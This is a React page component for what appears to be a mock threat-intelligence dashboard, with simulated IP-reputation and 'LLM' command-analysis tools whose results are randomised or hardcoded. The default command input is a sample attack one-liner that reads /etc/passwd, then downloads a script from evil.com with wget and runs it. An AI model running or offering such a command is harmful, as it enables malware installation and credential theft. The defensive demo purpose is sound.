import { useState } from 'react';
import styles from './ResearchPage.module.css';
import { randInt, randChoice, COUNTRIES } from '../services/mockData';
import { Chart as ChartJS, ArcElement, Tooltip, Legend } from 'chart.js';
import { Doughnut } from 'react-chartjs-2';

ChartJS.register(ArcElement, Tooltip, Legend);

const ResearchPage = () => {
  const [ipInput, setIpInput] = useState('185.220.101.34');
  const [ipOutput, setIpOutput] = useState('');
  const [cmdInput, setCmdInput] = useState('cat /etc/passwd; wget http://evil.com/bot.sh -O /tmp/.x; chmod +x /tmp/.x && /tmp/.x');
  const [cmdOutput, setCmdOutput] = useState('');

  const lookupIP = () => {
    setIpOutput('// Looking up ' + ipInput + '...\n');
    setTimeout(() => {
      const country = randChoice(COUNTRIES);
      setIpOutput(`IP: ${ipInput}
Country: ${country.flag} ${country.name}
ASN: AS${randInt(1000,65000)} — ${randChoice(['Digital Ocean','Linode','Hetzner','OVH','Vultr'])}
ISP: ${randChoice(['Cloud Provider','Data Center','Residential ISP','VPN Exit Node'])}
Threat Score: ${randInt(60,98)}/100 — MALICIOUS
Abuse Reports: ${randInt(12,847)} reports in last 30d
First Seen: ${randInt(1,12)} months ago`);
    }, 600);
  };

  const analyzeCmd = () => {
    setCmdOutput('// Analyzing with LLM...\n');
    setTimeout(() => {
      setCmdOutput(`BEHAVIORAL ANALYSIS:
━━━━━━━━━━━━━━━━━━━━
Phase: POST-EXPLOITATION
Sophistication: INTERMEDIATE
Intent: MALWARE DEPLOYMENT

COMMAND BREAKDOWN:
→ cat /etc/passwd
  ⚠ Credential harvest
→ wget http://evil.com/bot.sh
  ⚠ Malware download
→ chmod +x /tmp/.x && /tmp/.x
  ⚠ Execution & Persistence`);
    }, 1200);
  };

  const phasesData = {
    labels: ['Recon', 'Privilege Esc.', 'Persistence', 'Exfiltration', 'C2'],
    datasets: [{ data: [42, 28, 15, 10, 5], backgroundColor: ['#00d4ff','#f59e0b','#10b981','#ef4444','#8b5cf6'], borderWidth: 0 }]
  };

  return (
    <div className={styles.researchPage}>
      <h1 className={styles.pageTitle}>Research Tools</h1>
      <p className={styles.pageSub}>// integrated analysis suite for threat intelligence</p>
      
      <div className={styles.toolGrid}>
        <div className={styles.toolCard}>
          <div className={styles.toolTitle}>🔬 IP Intelligence</div>
          <div className={styles.toolDesc}>// GeoIP · ASN · threat reputation</div>
          <input 
            className={styles.toolInput} 
            value={ipInput} 
            onChange={(e) => setIpInput(e.target.value)}
          />
          <button className={styles.toolBtn} onClick={lookupIP}>→ ANALYZE IP</button>
          {ipOutput && <div className={styles.toolOutput}>{ipOutput}</div>}
        </div>

        <div className={styles.toolCard}>
          <div className={styles.toolTitle}>⚡ Command Analyzer (LLM)</div>
          <div className={styles.toolDesc}>// paste attacker commands → get behavioral analysis</div>
          <textarea 
            className={styles.toolInput} 
            rows="3" 
            value={cmdInput} 
            onChange={(e) => setCmdInput(e.target.value)}
          />
          <button className={styles.toolBtn} onClick={analyzeCmd}>→ ANALYZE WITH LLM</button>
          {cmdOutput && <div className={styles.toolOutput}>{cmdOutput}</div>}
        </div>

        <div className={styles.toolCard}>
          <div className={styles.toolTitle}>📊 Session Statistics</div>
          <div className={styles.toolDesc}>// attack phase breakdown</div>
          <div style={{ position: 'relative', height: '180px', marginTop: '12px' }}>
            <Doughnut 
              data={phasesData} 
              options={{
                responsive: true, maintainAspectRatio: false,
                plugins: { legend: { position:'right', labels: { color:'#8892a4', font:{family:'IBM Plex Mono',size:9}, boxWidth:8, padding:6 } } }
              }} 
            />
          </div>
        </div>
      </div>
    </div>
  );
};

export default ResearchPage;
